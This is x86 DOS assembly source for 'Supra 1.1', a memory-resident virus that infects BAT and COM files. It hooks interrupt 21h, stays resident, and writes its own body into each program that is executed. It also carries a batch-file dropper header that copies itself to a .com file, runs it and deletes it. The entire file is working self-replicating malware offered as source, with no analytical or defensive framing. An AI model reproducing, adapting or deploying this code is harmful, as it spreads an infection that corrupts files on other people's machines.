   ; %%%%%%%%%%%%%
   ; % Supra 1.1 %
   ; %%%%%%%%%%%%%
   ;
   ; Memory resident bat/com infector.

   .model tiny
   .code
   org 100h
   start:
   db "::"
   jmp vm_start ; jmp virus start
   db 13,10
   db "@copy %0 $-$.com>nul",13,10
   db "@$-$.com",13,10
   db "@del $-$.com",13,10
   db "::"
   vm_start:
   mov ax,3521h ; get interrupt vector 21h
   int 21h
   mov word ptr [int21_addr],bx
   mov word ptr [Int21_addr+02h],es
   mov ah,25h ; set interrupt vector 21h
   mov dx,offset int21_vir
   int 21h
   not dh
   int 27h ; stay resident
   int21_vir:
   cmp ah,4bh ; execute program
   je  execute
   cmp al,21 ; install check
   jne int21_e
   cmp dx,offset int21_vir
   jne int21_e
   Restore_Control: ;restore host file
   mov di,100
   pop si
   mov si,offset vend
   push di
   mov ch,0fdh ; copy host file in memory
   repnz movsb
   xor ax,ax
   iret
   execute: ; infect proc
   push ax
   push bx
   push cx
   push dx
   push ds
   mov ax,3d02h ; open file
   int 21h
   xchg ax,bx
   push cs
   pop ds
   mov ah,3fh ; read file
   mov dx,offset vend
   mov ch,0feh
   int 21h
   mov si,dx
   cmp byte ptr [si],':' ; infect?
   je done ; file already infected
   push ax
   mov ax,4200h
   xor cx,cx                   ;Go to beginning of prog.
   xor dx,dx
   int 21h
   pop cx
   mov ah,40h ; write virii
   add cx,vend-start
   inc dh
   int 21h
   done:
   mov ah,3eh ;close file
   int 21h
   pop ds
   pop dx
   pop cx
   pop bx
   pop ax
   int21_e:
   db 0eah ;jump to int 21
   int21_addr dd ? ; address of interrupt 21h
   vend:
   virname db 'Supra'
   quit: ret
   end start
